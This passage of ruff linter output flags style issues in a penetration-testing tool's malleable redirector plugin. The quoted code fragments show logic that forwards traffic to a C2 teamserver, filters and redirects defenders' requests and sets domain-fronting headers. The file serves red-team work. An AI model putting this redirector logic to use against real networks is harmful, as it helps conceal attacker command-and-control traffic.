    |                         ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
567 |                         and self.proxyOptions[paramName] != ""
568 |                         and self.proxyOptions[paramName] != None
    |
help: Remove `.keys()`

E711 Comparison to `None` should be `cond is not None`
   --> security\penetration-testing-tools\web\proxy2\plugins\malleable_redirector.py:568:61
    |
566 |                         paramName in self.proxyOptions.keys()
567 |                         and self.proxyOptions[paramName] != ""
568 |                         and self.proxyOptions[paramName] != None
    |                                                             ^^^^
569 |                     ):
570 |                         p = os.path.join(configBasePath, self.proxyOptions[paramName])
    |
help: Replace with `cond is not None`

F841 [*] Local variable `e` is assigned to but never used
   --> security\penetration-testing-tools\web\proxy2\plugins\malleable_redirector.py:577:41
    |
575 |                             self.proxyOptions[paramName] = p
576 |
577 |             except FileNotFoundError as e:
    |                                         ^
578 |                 self.logger.fatal(
579 |                     f'Malleable-redirector config file not found: ({self.proxyOptions["config"]})!'
    |
help: Remove assignment to unused variable `e`

N806 Variable `profileSkipped` in function should be lowercase
   --> security\penetration-testing-tools\web\proxy2\plugins\malleable_redirector.py:587:13
    |
585 |                 )
586 |
587 |             profileSkipped = False
    |             ^^^^^^^^^^^^^^
588 |             if ("profile" not in self.proxyOptions.keys()) or (
589 |                 not self.proxyOptions["profile"]
    |

SIM118 Use `key not in dict` instead of `key not in dict.keys()`
   --> security\penetration-testing-tools\web\proxy2\plugins\malleable_redirector.py:588:17
    |
587 |             profileSkipped = False
588 |             if ("profile" not in self.proxyOptions.keys()) or (
    |                 ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
589 |                 not self.proxyOptions["profile"]
590 |             ):
    |
help: Remove `.keys()`

N806 Variable `profileSkipped` in function should be lowercase
   --> security\penetration-testing-tools\web\proxy2\plugins\malleable_redirector.py:600:17
    |
598 |                 )
599 |                 self.malleable = None
600 |                 profileSkipped = True
    |                 ^^^^^^^^^^^^^^
601 |
602 |             else:
    |

E721 Use `is` and `is not` for type comparisons, or `isinstance()` for isinstance checks
   --> security\penetration-testing-tools\web\proxy2\plugins\malleable_redirector.py:618:18
    |
616 |                     self.logger.fatal("Action/Drop URL must be specified!")
617 |
618 |             elif type(self.proxyOptions["action_url"]) == str:
    |                  ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
619 |                 url = self.proxyOptions["action_url"]
620 |                 if "," not in url:
    |

E721 Use `is` and `is not` for type comparisons, or `isinstance()` for isinstance checks
   --> security\penetration-testing-tools\web\proxy2\plugins\malleable_redirector.py:629:18
    |
627 |                     ]
628 |
629 |             elif type(self.proxyOptions["action_url"]) == None and profileSkipped:
    |                  ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
630 |                 self.proxyOptions["action_url"] = []
    |

E711 Comparison to `None` should be `cond is None`
   --> security\penetration-testing-tools\web\proxy2\plugins\malleable_redirector.py:629:59
    |
627 |                     ]
628 |
629 |             elif type(self.proxyOptions["action_url"]) == None and profileSkipped:
    |                                                           ^^^^
630 |                 self.proxyOptions["action_url"] = []
    |
help: Replace with `cond is None`

E711 Comparison to `None` should be `cond is None`
   --> security\penetration-testing-tools\web\proxy2\plugins\malleable_redirector.py:632:51
    |
630 |                 self.proxyOptions["action_url"] = []
631 |
632 |             if self.proxyOptions["proxy_pass"] == None:
    |                                                   ^^^^
633 |                 self.proxyOptions["proxy_pass"] = {}
    |
help: Replace with `cond is None`

E721 Use `is` and `is not` for type comparisons, or `isinstance()` for isinstance checks
   --> security\penetration-testing-tools\web\proxy2\plugins\malleable_redirector.py:635:19
    |
633 |                 self.proxyOptions["proxy_pass"] = {}
634 |
635 |             elif (type(self.proxyOptions["proxy_pass"]) != list) and (
    |                   ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
636 |                 type(self.proxyOptions["proxy_pass"]) != tuple
637 |             ):
    |

E721 Use `is` and `is not` for type comparisons, or `isinstance()` for isinstance checks
   --> security\penetration-testing-tools\web\proxy2\plugins\malleable_redirector.py:636:17
    |
635 |             elif (type(self.proxyOptions["proxy_pass"]) != list) and (
636 |                 type(self.proxyOptions["proxy_pass"]) != tuple
    |                 ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
637 |             ):
638 |                 self.logger.fatal("Proxy Pass must be a list of entries if used!")
    |

UP032 [*] Use f-string instead of `format` call
   --> security\penetration-testing-tools\web\proxy2\plugins\malleable_redirector.py:657:29
    |
655 |                       if len(splits) < 2:
656 |                           self.logger.fatal(
657 | /                             "Invalid Proxy Pass entry: ({}): invalid syntax: <url host [options]> required!".format(
658 | |                                 entry
659 | |                             )
    | |_____________________________^
660 |                           )
    |
help: Convert to f-string

SIM108 Use ternary operator `v = opt2[1] if len(opt2) == 2 else "=".join(opt2[1:])` instead of `if`-`else`-block
   --> security\penetration-testing-tools\web\proxy2\plugins\malleable_redirector.py:707:29
    |
705 |                               k = opt2[0]
706 |                               v = ""
707 | /                             if len(opt2) == 2:
708 | |                                 v = opt2[1]
709 | |                             else:
710 | |                                 v = "=".join(opt2[1:])
    | |______________________________________________________^
711 |
712 |                               passes[num]["options"][k.strip()] = v.strip()
    |
help: Replace `if`-`else`-block with `v = opt2[1] if len(opt2) == 2 else "=".join(opt2[1:])`

SIM113 Use `enumerate()` for index variable `num` in `for` loop
   --> security\penetration-testing-tools\web\proxy2\plugins\malleable_redirector.py:726:21
    |
724 |                         )
725 |
726 |                     num += 1
    |                     ^^^^^^^^
727 |
728 |                 if len(passes) > 0:
    |

UP032 [*] Use f-string instead of `format` call
   --> security\penetration-testing-tools\web\proxy2\plugins\malleable_redirector.py:746:49
    |
744 | ΓÇª                     for k, v in e["options"].items():
745 | ΓÇª                         if len(v) > 0:
746 | ΓÇª                             opts.append("{}: {}".format(k, v))
    |                                           ^^^^^^^^^^^^^^^^^^^^^
747 | ΓÇª                         else:
748 | ΓÇª                             opts.append("{}".format(k))
    |
help: Convert to f-string

UP032 [*] Use f-string instead of `format` call
   --> security\penetration-testing-tools\web\proxy2\plugins\malleable_redirector.py:748:49
    |
746 |                                     opts.append("{}: {}".format(k, v))
747 |                                 else:
748 |                                     opts.append("{}".format(k))
    |                                                 ^^^^^^^^^^^^^^
749 |
750 |                             line += ", ".join(opts) + ")"
    |
help: Convert to f-string

E721 Use `is` and `is not` for type comparisons, or `isinstance()` for isinstance checks
   --> security\penetration-testing-tools\web\proxy2\plugins\malleable_redirector.py:763:16
    |
761 |             #    self.logger.fatal('Teamserver URL must be specified!')
762 |
763 |             if type(self.proxyOptions["teamserver_url"]) == str:
    |                ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
764 |                 self.proxyOptions["teamserver_url"] = [
765 |                     self.proxyOptions["teamserver_url"],
    |

UP032 [*] Use f-string instead of `format` call
   --> security\penetration-testing-tools\web\proxy2\plugins\malleable_redirector.py:781:29
    |
779 |                         if inport < 1 or inport > 65535:
780 |                             raise Exception()
781 |                         o = "originating from {} ".format(inport)
    |                             ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
782 |
783 |                     self.logger.dbg(
    |
help: Convert to f-string

UP032 [*] Use f-string instead of `format` call
   --> security\penetration-testing-tools\web\proxy2\plugins\malleable_redirector.py:800:21
    |
798 |                   raise
799 |                   self.logger.fatal(
800 | /                     "Teamserver's URL does not follow <[https?://]host:port> scheme! {}".format(
801 | |                         str(e)
802 | |                     )
    | |_____________________^
803 |                   )
    |
help: Convert to f-string

UP015 [*] Unnecessary mode argument
   --> security\penetration-testing-tools\web\proxy2\plugins\malleable_redirector.py:837:26
    |
835 |                 )
836 |
837 |             with open(p, "r") as f:
    |                          ^^^
838 |                 for line in f.readlines():
839 |                     if len(line.strip()) == 0:
    |
help: Remove mode argument

UP015 [*] Unnecessary mode argument
   --> security\penetration-testing-tools\web\proxy2\plugins\malleable_redirector.py:859:26
    |
857 |                 )
858 |
859 |             with open(p, "r") as f:
    |                          ^^^
860 |                 for line in f.readlines():
861 |                     if len(line.strip()) == 0:
    |
help: Remove mode argument

UP015 [*] Unnecessary mode argument
   --> security\penetration-testing-tools\web\proxy2\plugins\malleable_redirector.py:884:30
    |
882 |                     )
883 |
884 |                 with open(p, "r") as f:
    |                              ^^^
885 |                     for line in f.readlines():
886 |                         l = line.strip()
    |
help: Remove mode argument

E741 Ambiguous variable name: `l`
   --> security\penetration-testing-tools\web\proxy2\plugins\malleable_redirector.py:886:25
    |
884 |                 with open(p, "r") as f:
885 |                     for line in f.readlines():
886 |                         l = line.strip()
    |                         ^
887 |                         if l.startswith("#") or len(l) < 7:
888 |                             continue
    |

UP032 [*] Use f-string instead of `format` call
   --> security\penetration-testing-tools\web\proxy2\plugins\malleable_redirector.py:898:21
    |
897 |                 self.logger.info(
898 |                     "Loaded {} blacklisted CIDRs.".format(len(self.banned_ips))
    |                     ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
899 |                 )
    |
help: Convert to f-string

F841 Local variable `mydict` is assigned to but never used
   --> security\penetration-testing-tools\web\proxy2\plugins\malleable_redirector.py:902:76
    |
901 |             if self.proxyOptions["mitigate_replay_attack"]:
902 |                 with SqliteDict(ProxyPlugin.RequestsHashesDatabaseFile) as mydict:
    |                                                                            ^^^^^^
903 |                     self.logger.info(
904 |                         "Opening request hashes SQLite from file {} to prevent Replay Attacks.".format(
    |
help: Remove assignment to unused variable `mydict`

UP032 [*] Use f-string instead of `format` call
   --> security\penetration-testing-tools\web\proxy2\plugins\malleable_redirector.py:904:25
    |
902 |                   with SqliteDict(ProxyPlugin.RequestsHashesDatabaseFile) as mydict:
903 |                       self.logger.info(
904 | /                         "Opening request hashes SQLite from file {} to prevent Replay Attacks.".format(
905 | |                             ProxyPlugin.RequestsHashesDatabaseFile
906 | |                         )
    | |_________________________^
907 |                       )
    |
help: Convert to f-string

SIM118 Use `key in dict` instead of `key in dict.keys()`
   --> security\penetration-testing-tools\web\proxy2\plugins\malleable_redirector.py:910:17
    |
909 |             if (
910 |                 "policy" in self.proxyOptions.keys()
    |                 ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
911 |                 and self.proxyOptions["policy"] != None
912 |                 and len(self.proxyOptions["policy"]) > 0
    |
help: Remove `.keys()`

E711 Comparison to `None` should be `cond is not None`
   --> security\penetration-testing-tools\web\proxy2\plugins\malleable_redirector.py:911:52
    |
909 |             if (
910 |                 "policy" in self.proxyOptions.keys()
911 |                 and self.proxyOptions["policy"] != None
    |                                                    ^^^^
912 |                 and len(self.proxyOptions["policy"]) > 0
913 |             ):
    |
help: Replace with `cond is not None`

UP032 [*] Use f-string instead of `format` call
   --> security\penetration-testing-tools\web\proxy2\plugins\malleable_redirector.py:916:28
    |
914 |                 log = "Enabled policies:\n"
915 |                 for k, v in self.proxyOptions["policy"].items():
916 |                     log += "\t{}: {}\n".format(k, str(v))
    |                            ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
917 |                 self.logger.dbg(log)
918 |             else:
    |
help: Convert to f-string

SIM118 Use `key in dict` instead of `key in dict.keys()`
   --> security\penetration-testing-tools\web\proxy2\plugins\malleable_redirector.py:924:17
    |
923 |               if (
924 | /                 "add_peers_to_whitelist_if_they_sent_valid_requests"
925 | |                 in self.proxyOptions.keys()
    | |___________________________________________^
926 |                   and self.proxyOptions[
927 |                       "add_peers_to_whitelist_if_they_sent_valid_requests"
    |
help: Remove `.keys()`

E711 Comparison to `None` should be `cond is not None`
   --> security\penetration-testing-tools\web\proxy2\plugins\malleable_redirector.py:929:20
    |
927 |                     "add_peers_to_whitelist_if_they_sent_valid_requests"
928 |                 ]
929 |                 != None
    |                    ^^^^
930 |                 and len(
931 |                     self.proxyOptions[
    |
help: Replace with `cond is not None`

SIM118 Use `key not in dict` instead of `key not in dict.keys()`
   --> security\penetration-testing-tools\web\proxy2\plugins\malleable_redirector.py:944:25
    |
942 |                   ].items():
943 |                       if (
944 | /                         k
945 | |                         not in ProxyPlugin.DefaultRedirectorConfig[
946 | |                             "add_peers_to_whitelist_if_they_sent_valid_requests"
947 | |                         ].keys()
    | |________________________________^
948 |                       ):
949 |                           self.logger.err(
    |
help: Remove `.keys()`

UP032 [*] Use f-string instead of `format` call
   --> security\penetration-testing-tools\web\proxy2\plugins\malleable_redirector.py:950:29
    |
948 |                       ):
949 |                           self.logger.err(
950 | /                             "Dynamic whitelisting threshold named ({}) not supported! Skipped..".format(
951 | |                                 k
952 | |                             )
    | |_____________________________^
953 |                           )
    |
help: Convert to f-string

UP032 [*] Use f-string instead of `format` call
   --> security\penetration-testing-tools\web\proxy2\plugins\malleable_redirector.py:955:28
    |
953 |                         )
954 |
955 |                     log += "\t{}: {}\n".format(k, str(v))
    |                            ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
956 |                 self.logger.dbg(log)
    |
help: Convert to f-string

N803 Argument name `peerIP` should be lowercase
   --> security\penetration-testing-tools\web\proxy2\plugins\malleable_redirector.py:964:34
    |
962 |                 ] = {}
963 |
964 |     def report(self, ret, ts="", peerIP="", path="", userAgentValue=""):
    |                                  ^^^^^^^^^
965 |         prefix = "ALLOW"
966 |         col = "green"
    |

N803 Argument name `userAgentValue` should be lowercase
   --> security\penetration-testing-tools\web\proxy2\plugins\malleable_redirector.py:964:54
    |
962 |                 ] = {}
963 |
964 |     def report(self, ret, ts="", peerIP="", path="", userAgentValue=""):
    |                                                      ^^^^^^^^^^^^^^^^^
965 |         prefix = "ALLOW"
966 |         col = "green"
    |

UP032 [*] Use f-string instead of `format` call
   --> security\penetration-testing-tools\web\proxy2\plugins\malleable_redirector.py:979:13
    |
978 |           self.logger.info(
979 | /             '[{}, {}, {}] "{}" - UA: "{}"'.format(
980 | |                 prefix, ts, peerIP, path, userAgentValue
981 | |             ),
    | |_____________^
982 |               color=col,
983 |               forced=True,
    |
help: Convert to f-string

N803 Argument name `peerIP` should be lowercase
   --> security\penetration-testing-tools\web\proxy2\plugins\malleable_redirector.py:989:22
    |
988 |     @staticmethod
989 |     def get_mock_req(peerIP, command, path, headers):
    |                      ^^^^^^
990 |         class Request(object):
991 |             pass
    |

UP004 [*] Class `Request` inherits from `object`
   --> security\penetration-testing-tools\web\proxy2\plugins\malleable_redirector.py:990:23
    |
988 |     @staticmethod
989 |     def get_mock_req(peerIP, command, path, headers):
990 |         class Request(object):
    |                       ^^^^^^
991 |             pass
    |
help: Remove `object` inheritance

N806 Variable `peerIP` in function should be lowercase
    --> security\penetration-testing-tools\web\proxy2\plugins\malleable_redirector.py:1019:9
     |
1017 |         }
1018 |
1019 |         peerIP = req.client_address[0]
     |         ^^^^^^
1020 |
1021 |         for k, v in req.headers.items():
     |

SIM118 [*] Use `key in dict` instead of `key in dict.keys()`
    --> security\penetration-testing-tools\web\proxy2\plugins\malleable_redirector.py:1022:16
     |
1021 |         for k, v in req.headers.items():
1022 |             if k.lower() in originating_ip_headers.keys():
     |                ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
1023 |                 res = re.findall(originating_ip_headers[k.lower()], v, re.I)
1024 |                 if res and len(res) > 0:
     |
help: Remove `.keys()`

N806 Variable `peerIP` in function should be lowercase
    --> security\penetration-testing-tools\web\proxy2\plugins\malleable_redirector.py:1025:21
     |
1023 |                 res = re.findall(originating_ip_headers[k.lower()], v, re.I)
1024 |                 if res and len(res) > 0:
1025 |                     peerIP = res[0]
     |                     ^^^^^^
1026 |                     break
     |

E722 Do not use bare `except`
    --> security\penetration-testing-tools\web\proxy2\plugins\malleable_redirector.py:1040:9
     |
1038 |             inport = int(_ts[0])
1039 |             ts = ":".join(_ts[1:])
1040 |         except:
     |         ^^^^^^
1041 |             pass
     |

F841 Local variable `u` is assigned to but never used
    --> security\penetration-testing-tools\web\proxy2\plugins\malleable_redirector.py:1061:13
     |
1059 |         self.logger.dbg("Peer reached the server at port: " + str(req.server_port))
1060 |         for s in self.proxyOptions["teamserver_url"]:
1061 |             u = urlparse(req.uri)
     |             ^
1062 |             inport, scheme, host, port = self.interpretTeamserverUrl(s)
1063 |             if inport == req.server_port:
     |
help: Remove assignment to unused variable `u`

SIM114 [*] Combine `if` branches using logical `or` operator
    --> security\penetration-testing-tools\web\proxy2\plugins\malleable_redirector.py:1063:13
     |
1061 |               u = urlparse(req.uri)
1062 |               inport, scheme, host, port = self.interpretTeamserverUrl(s)
1063 | /             if inport == req.server_port:
1064 | |                 return s
1065 | |             elif inport == "":
1066 | |                 return s
     | |________________________^
1067 |
1068 |           # return req.uri
     |
help: Combine `if` branches

F841 Local variable `netloc` is assigned to but never used
    --> security\penetration-testing-tools\web\proxy2\plugins\malleable_redirector.py:1074:17
     |
1072 |         # Passing the request forward.
1073 |         u = urlparse(req.uri)
1074 |         scheme, netloc, path = (
     |                 ^^^^^^
1075 |             u.scheme,
1076 |             u.netloc,
     |
help: Remove assignment to unused variable `netloc`

F841 Local variable `path` is assigned to but never used
    --> security\penetration-testing-tools\web\proxy2\plugins\malleable_redirector.py:1074:25
     |
1072 |         # Passing the request forward.
1073 |         u = urlparse(req.uri)
1074 |         scheme, netloc, path = (
     |                         ^^^^
1075 |             u.scheme,
1076 |             u.netloc,
     |
help: Remove assignment to unused variable `path`

F841 Local variable `orighost` is assigned to but never used
    --> security\penetration-testing-tools\web\proxy2\plugins\malleable_redirector.py:1081:9
     |
1079 |         target = _target
1080 |         newhost = ""
1081 |         orighost = req.headers["Host"]
     |         ^^^^^^^^
1082 |
1083 |         if target in self.proxyOptions["teamserver_url"]:
     |
help: Remove assignment to unused variable `orighost`

SIM108 Use ternary operator `target = "https://" + target if req.is_ssl else "http://" + target` instead of `if`-`else`-block
    --> security\penetration-testing-tools\web\proxy2\plugins\malleable_redirector.py:1103:17
     |
1101 |           else:
1102 |               if not target.startswith("http"):
1103 | /                 if req.is_ssl:
1104 | |                     target = "https://" + target
1105 | |                 else:
1106 | |                     target = "http://" + target
     | |_______________________________________________^
1107 |
1108 |               w = urlparse(target)
     |
help: Replace `if`-`else`-block with `target = "https://" + target if req.is_ssl else "http://" + target`

F841 Local variable `path2` is assigned to but never used
    --> security\penetration-testing-tools\web\proxy2\plugins\malleable_redirector.py:1109:31
     |
1108 |             w = urlparse(target)
1109 |             scheme2, netloc2, path2 = (
     |                               ^^^^^
1110 |                 w.scheme,
1111 |                 w.netloc,
     |
help: Remove assignment to unused variable `path2`

UP032 [*] Use f-string instead of `format` call
    --> security\penetration-testing-tools\web\proxy2\plugins\malleable_redirector.py:1129:25
     |
1127 |             self.strip_headers(req, malleable_meta)
1128 |
1129 |         self.logger.dbg('Redirecting to "{}"'.format(req.uri))
     |                         ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
1130 |
1131 |         req.headers[proxy2_metadata_headers["ignore_response_decompression_errors"]] = (
     |
help: Convert to f-string

F405 `proxy2_metadata_headers` may be undefined, or defined from star imports
    --> security\penetration-testing-tools\web\proxy2\plugins\malleable_redirector.py:1131:21
     |
1129 |         self.logger.dbg('Redirecting to "{}"'.format(req.uri))
1130 |
1131 |         req.headers[proxy2_metadata_headers["ignore_response_decompression_errors"]] = (
     |                     ^^^^^^^^^^^^^^^^^^^^^^^
1132 |             "1"
1133 |         )
     |

F405 `proxy2_metadata_headers` may be undefined, or defined from star imports
    --> security\penetration-testing-tools\web\proxy2\plugins\malleable_redirector.py:1134:21
     |
1132 |             "1"
1133 |         )
1134 |         req.headers[proxy2_metadata_headers["override_host_header"]] = newhost
     |                     ^^^^^^^^^^^^^^^^^^^^^^^
1135 |
1136 |         if "host" in malleable_meta.keys() and len(malleable_meta["host"]) > 0:
     |

SIM118 Use `key in dict` instead of `key in dict.keys()`
    --> security\penetration-testing-tools\web\proxy2\plugins\malleable_redirector.py:1136:12
     |
1134 |         req.headers[proxy2_metadata_headers["override_host_header"]] = newhost
1135 |
1136 |         if "host" in malleable_meta.keys() and len(malleable_meta["host"]) > 0:
     |            ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
1137 |             req.headers[proxy2_metadata_headers["domain_front_host_header"]] = (
1138 |                 malleable_meta["host"]
     |
help: Remove `.keys()`

F405 `proxy2_metadata_headers` may be undefined, or defined from star imports
    --> security\penetration-testing-tools\web\proxy2\plugins\malleable_redirector.py:1137:25
     |
1136 |         if "host" in malleable_meta.keys() and len(malleable_meta["host"]) > 0:
1137 |             req.headers[proxy2_metadata_headers["domain_front_host_header"]] = (
     |                         ^^^^^^^^^^^^^^^^^^^^^^^
1138 |                 malleable_meta["host"]
1139 |             )
     |

UP032 [*] Use f-string instead of `format` call
    --> security\penetration-testing-tools\web\proxy2\plugins\malleable_redirector.py:1156:17
     |
1154 |           if section == "" or variant == "":
1155 |               self.logger.dbg(
1156 | /                 "strip_headers: No section name ({}) or variant ({}) provided!".format(
1157 | |                     section, variant
1158 | |                 ),
     | |_________________^
1159 |                   color="red",
1160 |               )
     |
help: Convert to f-string

SIM118 Use `key not in dict` instead of `key not in dict.keys()`
    --> security\penetration-testing-tools\web\proxy2\plugins\malleable_redirector.py:1163:12
     |
1161 |             return False
1162 |
1163 |         if section not in self.malleable.config.keys():
     |            ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
1164 |             self.logger.dbg(
1165 |                 "strip_headers: Section name ({}) not found in malleable.config!".format(
     |
help: Remove `.keys()`

UP032 [*] Use f-string instead of `format` call
    --> security\penetration-testing-tools\web\proxy2\plugins\malleable_redirector.py:1165:17
     |
1163 |           if section not in self.malleable.config.keys():
1164 |               self.logger.dbg(
1165 | /                 "strip_headers: Section name ({}) not found in malleable.config!".format(
1166 | |                     section
1167 | |                 ),
     | |_________________^
1168 |                   color="red",
1169 |               )
     |
help: Convert to f-string

SIM118 Use `key not in dict` instead of `key not in dict.keys()`
    --> security\penetration-testing-tools\web\proxy2\plugins\malleable_redirector.py:1172:12
     |
1170 |             return False
1171 |
1172 |         if variant not in self.malleable.config[section].keys():
     |            ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
1173 |             self.logger.dbg(
1174 |                 "strip_headers: Variant name ({}) not found in malleable.config[{}]!".format(
     |
help: Remove `.keys()`

UP032 [*] Use f-string instead of `format` call
    --> security\penetration-testing-tools\web\proxy2\plugins\malleable_redirector.py:1174:17
     |
1172 |           if variant not in self.malleable.config[section].keys():
1173 |               self.logger.dbg(
1174 | /                 "strip_headers: Variant name ({}) not found in malleable.config[{}]!".format(
1175 | |                     variant, section
1176 | |                 ),
     | |_________________^
1177 |                   color="red",
1178 |               )
     |
help: Convert to f-string

SIM118 Use `key in dict` instead of `key in dict.keys()`
    --> security\penetration-testing-tools\web\proxy2\plugins\malleable_redirector.py:1183:34
     |
1181 |         configblock = self.malleable.config[section][variant]
1182 |
1183 |         reqhdrs = [x.lower() for x in req.headers.keys()]
     |                                  ^^^^^^^^^^^^^^^^^^^^^^^
1184 |         expectedheaders = [x[0].lower() for x in configblock["client"]["header"]]
     |
help: Remove `.keys()`

SIM102 Use a single `if` statement instead of nested `if` statements
    --> security\penetration-testing-tools\web\proxy2\plugins\malleable_redirector.py:1188:9
     |
1186 |           dont_touch_these_headers = ["user-agent", "host"]
1187 |
1188 | /         if (
1189 | |             "http-config" in self.malleable.config.keys()
1190 | |             and "trust_x_forwarded_for" in self.malleable.config["http-config"].keys()
1191 | |         ):
1192 | |             if self.malleable.config["http-config"]["trust_x_forwarded_for"] == True:
     | |_____________________________________________________________________________________^
1193 |                   dont_touch_these_headers.append("x-forwarded-for")
     |
help: Combine `if` statements using `and`

SIM118 Use `key in dict` instead of `key in dict.keys()`
    --> security\penetration-testing-tools\web\proxy2\plugins\malleable_redirector.py:1189:13
     |
1188 |         if (
1189 |             "http-config" in self.malleable.config.keys()
     |             ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
1190 |             and "trust_x_forwarded_for" in self.malleable.config["http-config"].keys()
1191 |         ):
     |
help: Remove `.keys()`

SIM118 Use `key in dict` instead of `key in dict.keys()`
    --> security\penetration-testing-tools\web\proxy2\plugins\malleable_redirector.py:1190:17
     |
1188 |         if (
1189 |             "http-config" in self.malleable.config.keys()
1190 |             and "trust_x_forwarded_for" in self.malleable.config["http-config"].keys()
     |                 ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
1191 |         ):
1192 |             if self.malleable.config["http-config"]["trust_x_forwarded_for"] == True:
     |
help: Remove `.keys()`

E712 Avoid equality comparisons to `True`; use `...:` for truth checks
    --> security\penetration-testing-tools\web\proxy2\plugins\malleable_redirector.py:1192:16
     |
1190 |             and "trust_x_forwarded_for" in self.malleable.config["http-config"].keys()
1191 |         ):
1192 |             if self.malleable.config["http-config"]["trust_x_forwarded_for"] == True:
     |                ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
1193 |                 dont_touch_these_headers.append("x-forwarded-for")
     |
help: Replace comparison

SIM118 Use `key in dict` instead of `key in dict.keys()`
    --> security\penetration-testing-tools\web\proxy2\plugins\malleable_redirector.py:1196:16
     |
1195 |         for b in MalleableParser.TransactionBlocks:
1196 |             if b in configblock["client"].keys():
     |                ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
1197 |                 if type(configblock["client"][b]) != dict:
1198 |                     continue
     |
help: Remove `.keys()`

E721 Use `is` and `is not` for type comparisons, or `isinstance()` for isinstance checks
    --> security\penetration-testing-tools\web\proxy2\plugins\malleable_redirector.py:1197:20
     |
1195 |         for b in MalleableParser.TransactionBlocks:
1196 |             if b in configblock["client"].keys():
1197 |                 if type(configblock["client"][b]) != dict:
     |                    ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
1198 |                     continue
     |

F405 `proxy2_metadata_headers` may be undefined, or defined from star imports
    --> security\penetration-testing-tools\web\proxy2\plugins\malleable_redirector.py:1214:25
     |
1213 |         if len(strip_headers_during_forward) > 0:
1214 |             req.headers[proxy2_metadata_headers["strip_headers_during_forward"]] = (
     |                         ^^^^^^^^^^^^^^^^^^^^^^^
1215 |                 ",".join(strip_headers_during_forward)
1216 |             )
     |

N806 Variable `jsonParsed` in function should be lowercase
    --> security\penetration-testing-tools\web\proxy2\plugins\malleable_redirector.py:1223:15
     |
1221 |         self.is_request = False
1222 |         self.logger.dbg("malleable_redirector: response_handler")
1223 |         (ret, jsonParsed) = self.checkIfHiddenAPICall(req, req_body)
     |               ^^^^^^^^^^
1224 |
1225 |         if ret:
     |

N806 Variable `jsonParsed` in function should be lowercase
    --> security\penetration-testing-tools\web\proxy2\plugins\malleable_redirector.py:1234:15
     |
1232 |     def request_handler(self, req, req_body, res="", res_body=""):
1233 |         self.is_request = True
1234 |         (ret, jsonParsed) = self.checkIfHiddenAPICall(req, req_body)
     |               ^^^^^^^^^^
1235 |
1236 |         if ret:
     |

F405 `DontFetchResponseException` may be undefined, or defined from star imports
    --> security\penetration-testing-tools\web\proxy2\plugins\malleable_redirector.py:1241:20
     |
1239 |                 + jsonParsed["peerIP"]
1240 |             )
1241 |             return DontFetchResponseException(
     |                    ^^^^^^^^^^^^^^^^^^^^^^^^^^
1242 |                 "Hidden API call request. Moving along to generate response."
1243 |             )
     |

E721 Use `is` and `is not` for type comparisons, or `isinstance()` for isinstance checks
    --> security\penetration-testing-tools\web\proxy2\plugins\malleable_redirector.py:1281:21
     |
1279 |                 url = self.proxyOptions["action_url"]
1280 |                 if (
1281 |                     type(self.proxyOptions["action_url"]) == list
     |                     ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
1282 |                     or type(self.proxyOptions["action_url"]) == tuple
1283 |                 ) and len(self.proxyOptions["action_url"]) > 0:
     |

E721 Use `is` and `is not` for type comparisons, or `isinstance()` for isinstance checks
    --> security\penetration-testing-tools\web\proxy2\plugins\malleable_redirector.py:1282:24
     |
1280 |                 if (
1281 |                     type(self.proxyOptions["action_url"]) == list
1282 |                     or type(self.proxyOptions["action_url"]) == tuple
     |                        ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
1283 |                 ) and len(self.proxyOptions["action_url"]) > 0:
     |

UP032 [*] Use f-string instead of `format` call
    --> security\penetration-testing-tools\web\proxy2\plugins\malleable_redirector.py:1287:25
     |
1285 |                     url = random.choice(self.proxyOptions["action_url"])
1286 |                     self.logger.dbg(
1287 |                         'Randomly choosen redirect to URL: "{}"'.format(url)
     |                         ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
1288 |                     )
     |
help: Convert to f-string

UP032 [*] Use f-string instead of `format` call
    --> security\penetration-testing-tools\web\proxy2\plugins\malleable_redirector.py:1291:21
     |
1290 |                   self.logger.err(
1291 | /                     "[PROXYING invalid request from {}] {} {}".format(
1292 | |                         req.client_address[0], req.method, req.uri
1293 | |                     ),
     | |_____________________^
1294 |                       color="cyan",
1295 |                   )
     |
help: Convert to f-string

UP032 [*] Use f-string instead of `format` call
    --> security\penetration-testing-tools\web\proxy2\plugins\malleable_redirector.py:1302:33
     |
1300 |         elif drop_request and host_action == 2:
1301 |             if newhost.startswith("http://") or newhost.startswith("https://"):
1302 |                 self.logger.dbg('Altering URL to: "{}"'.format(newhost))
     |                                 ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
1303 |             else:
1304 |                 self.logger.dbg('Altering host header to: "{}"'.format(newhost))
     |
